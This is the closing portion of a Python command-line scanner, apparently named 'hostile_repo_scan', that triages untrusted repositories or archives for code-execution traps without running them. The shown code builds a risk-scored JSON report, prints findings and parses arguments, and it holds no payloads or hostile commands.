        label = ("Clean" if score == 0 else "Low Risk" if score <= 15 else "Moderate Risk" if score <= 40
                 else "High Risk" if score <= 70 else "Critical Risk" if score < 100 else "Maximum Risk")
        return {
            "report": {
                "project": os.path.basename(os.path.abspath(self.target)),
                "path": self.target, "target_kind": self.target_kind,
                "date": _dt.date.today().isoformat(),
                "scanner": "hostile_repo_scan", "scanner_version": SCANNER_VERSION,
                "files_scanned": self.files_scanned, "total_findings": len(out),
                "risk_score": score, "risk_label": label,
                "verdict": "HOSTILE — do not run git or any tooling" if counters["critical"] else
                           ("SUSPICIOUS — review before use" if counters["high"] else "No hostile indicators found"),
                "score_breakdown": {**{s: counters[s] for s in SEVERITY_ORDER}, "raw_score": raw, "capped": raw > 100},
            },
            "summary": {s: counters[s] for s in SEVERITY_ORDER},
            "findings": out,
        }


# ─── CLI ─────────────────────────────────────────────────────────────────────

def default_ioc_files() -> list[str]:
    base = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "references", "iocs")
    if not os.path.isdir(base):
        return []
    return sorted(os.path.join(base, f) for f in os.listdir(base) if f.endswith(".json"))


def print_human(rep: dict) -> None:
    r = rep["report"]
    icon = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🔵", "info": "⚪"}
    print(f"\nHostile repository triage — {r['path']} ({r['target_kind']}, {r['files_scanned']} files)")
    print(f"Verdict: {r['verdict']}   Risk: {r['risk_score']}/100 ({r['risk_label']})")
    print("  " + "  ".join(f"{icon[s]} {s.upper()} {rep['summary'][s]}" for s in SEVERITY_ORDER))
    for f in rep["findings"]:
        if f["severity"] == "info":
            continue
        loc = f"{f['file']}" + (f":{f['line']}" if f["line"] else "")
        print(f"\n{icon[f['severity']]} {f['id']} [{f['check']}] {loc}\n   {f['description']}")
        if f["vulnerable_code"]:
            print(f"   evidence: {f['vulnerable_code']}")
    print()


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Detect code-execution traps in an untrusted repo/archive (never executes it).")
    ap.add_argument("target", help="directory, .zip, .tar, .tar.gz or .tgz")
    ap.add_argument("--output", "-o", help="write JSON report here")
    ap.add_argument("--iocs", nargs="*", default=None, help="IOC JSON files (default: references/iocs/*.json)")
    ap.add_argument("--exclude", nargs="*", default=[], help="glob(s) of paths to skip")
    ap.add_argument("--quiet", "-q", action="store_true", help="no human-readable output")
    args = ap.parse_args(argv)

    if not os.path.exists(args.target):
        print(f"error: {args.target} not found", file=sys.stderr)
        return 2
    try:
        scanner = Scanner(args.target, load_iocs(args.iocs if args.iocs is not None else default_ioc_files()), args.exclude)
        scanner.run()
        rep = scanner.report()
    except (ValueError, zipfile.BadZipFile, tarfile.TarError, OSError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2

    if args.output:
        os.makedirs(os.path.dirname(os.path.abspath(args.output)), exist_ok=True)
        with open(args.output, "w", encoding="utf-8") as fh:
            json.dump(rep, fh, indent=2)
    if not args.quiet:
        print_human(rep)
    return 1 if (rep["summary"]["critical"] or rep["summary"]["high"]) else 0


if __name__ == "__main__":
    sys.exit(main())
